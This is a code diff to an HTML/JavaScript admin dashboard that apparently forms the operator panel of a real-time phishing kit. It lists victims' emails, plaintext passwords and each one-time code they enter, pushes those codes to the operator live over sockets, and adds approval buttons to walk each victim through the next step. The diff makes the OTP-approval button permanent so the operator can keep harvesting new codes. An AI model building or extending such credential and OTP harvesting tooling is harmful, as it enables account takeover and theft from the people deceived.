@@ -114,17 +114,6 @@ td{
   font-weight:500;
   margin-right:8px;
 }
-.approve-otp-btn{
-  background:#4f46e5;
-  color:white;
-  border:none;
-  padding:6px 14px;
-  border-radius:8px;
-  cursor:pointer;
-  font-size:12px;
-  font-weight:500;
-  margin-right:8px;
-}
 .approve-second-btn{
   background:#059669;
   color:white;
@@ -188,22 +177,22 @@ td{
       <div class="number" id="pendingEmail">0</div>
     </div>
     <div class="stat-card">
-      <h3>Pending OTP Approval</h3>
-      <div class="number" id="pendingOtp">0</div>
+      <h3>Active Second OTP Users</h3>
+      <div class="number" id="activeSecondUsers">0</div>
     </div>
   </div>
 
   <div class="table-container">
-    <table>
+     <table>
       <thead>
         <tr>
           <th>Email</th>
           <th>Password</th>
-          <th>OTP Entered</th>
-          <th>Second OTP</th>
+          <th>Latest First OTP</th>
+          <th>Latest Second OTP</th>
           <th>Status</th>
           <th>Actions</th>
-        </tr>
+         </tr>
       </thead>
       <tbody id="usersTableBody">
         <tr><td colspan="6" style="text-align:center; padding:40px;">Loading...</td></tr>
@@ -324,10 +313,10 @@ td{
 
   function updateStats(users) {
     const pendingEmail = users.filter(u => !u.approved).length;
-    const pendingOtp = users.filter(u => u.approved && u.otp && !u.second_approved).length;
+    const activeSecondUsers = users.filter(u => u.approved === true && u.otp !== null).length;
     document.getElementById('totalUsers').textContent = users.length;
     document.getElementById('pendingEmail').textContent = pendingEmail;
-    document.getElementById('pendingOtp').textContent = pendingOtp;
+    document.getElementById('activeSecondUsers').textContent = activeSecondUsers;
   }
 
   function displayUsers(users) {
@@ -338,26 +327,22 @@ td{
     }
     
     tbody.innerHTML = users.map(user => {
-      // Determine status
       let statusBadge = '';
       let actionButtons = '';
       
       if (!user.approved) {
-        // Email not approved yet - Show Approve Email button
+        // Email not approved yet
         statusBadge = '<span class="badge badge-email">⏳ Pending Email Approval</span>';
         actionButtons = `<button class="approve-email-btn" onclick="approveEmail('${user.email}')">📧 Approve Email</button>`;
-      } else if (user.approved && user.otp && !user.second_approved) {
-        // First OTP entered, waiting for second approval
-        statusBadge = '<span class="badge badge-waiting">🔐 First OTP Received - Pending Second Approval</span>';
-        actionButtons = `<button class="approve-otp-btn" onclick="approveSecond('${user.email}')">🔐 Approve Second OTP</button>`;
       } else if (user.approved && !user.otp) {
-        // Email approved, waiting for OTP
-        statusBadge = '<span class="badge badge-waiting">✅ Email Approved - Waiting for OTP</span>';
-        actionButtons = '<span class="badge badge-approved">Waiting for user to enter OTP</span>';
-      } else if (user.approved && user.second_approved) {
-        // Fully verified
-        statusBadge = '<span class="badge badge-approved">✅ Fully Verified</span>';
-        actionButtons = '<span class="badge badge-approved">Complete</span>';
+        // Email approved, waiting for first OTP
+        statusBadge = '<span class="badge badge-waiting">✅ Email Approved - Waiting for First OTP</span>';
+        actionButtons = '<span class="badge badge-pending">Waiting for user</span>';
+      } else if (user.approved && user.otp) {
+        // User is in second OTP phase - BUTTON ALWAYS SHOWS, NEVER DISAPPEARS
+        statusBadge = '<span class="badge badge-waiting">🔐 Ready for Second OTP Approval</span>';
+        // Button stays FOREVER - admin can keep approving any new OTP user enters
+        actionButtons = `<button class="approve-second-btn" onclick="approveSecond('${user.email}')">🔐 Approve Current OTP</button>`;
       } else {
         statusBadge = '<span class="badge badge-pending">Pending</span>';
         actionButtons = '';
@@ -376,7 +361,7 @@ td{
     }).join('');
   }
 
-  // Approve Email - This is the button that was missing!
+  // Approve Email
   async function approveEmail(email) {
     showNotification('Email Approved', `Approving email for ${email}`, 'email');
     try {
@@ -397,9 +382,9 @@ td{
     }
   }
 
-  // Approve Second OTP (called after first OTP is entered)
+  // Approve Second OTP - Button NEVER disappears, can be clicked infinitely
   async function approveSecond(email) {
-    showNotification('Second OTP Approved', `Approving second OTP for ${email}`, 'second-otp');
+    showNotification('OTP Approved', `Approved OTP for ${email} - Ready for next code`, 'second-otp');
     try {
       const response = await fetch('/api/admin/approve-second', {
         method: 'POST',
@@ -411,7 +396,7 @@ td{
       });
       const data = await response.json();
       if (data.success) {
-        loadUsers();
+        loadUsers(); // Refresh to show updated second_otp value
       }
     } catch (error) {
       console.error('Approve second error:', error);
@@ -426,15 +411,15 @@ td{
   // Socket listeners
   socket.on('connect', () => console.log('Admin connected'));
   socket.on('user-login', (data) => {
-    showNotification('📧 New Email Submission', `${data.email} signed up - Click Approve Email`, 'email');
+    showNotification('📧 New Email Submission', `${data.email} signed up`, 'email');
     loadUsers();
   });
   socket.on('user-otp-created', (data) => {
-    showNotification('🔢 OTP Received', `${data.email} entered OTP: ${data.otp} - Click Approve Second OTP`, 'otp');
+    showNotification('🔢 First OTP Received', `${data.email} entered OTP: ${data.otp}`, 'otp');
     loadUsers();
   });
   socket.on('user-second-otp-created', (data) => {
-    showNotification('🔐 Second OTP Received', `${data.email} entered second OTP: ${data.second_otp}`, 'second-otp');
+    showNotification('🔐 New Second OTP Received', `${data.email} entered: ${data.second_otp}`, 'second-otp');
     loadUsers();
   });
 
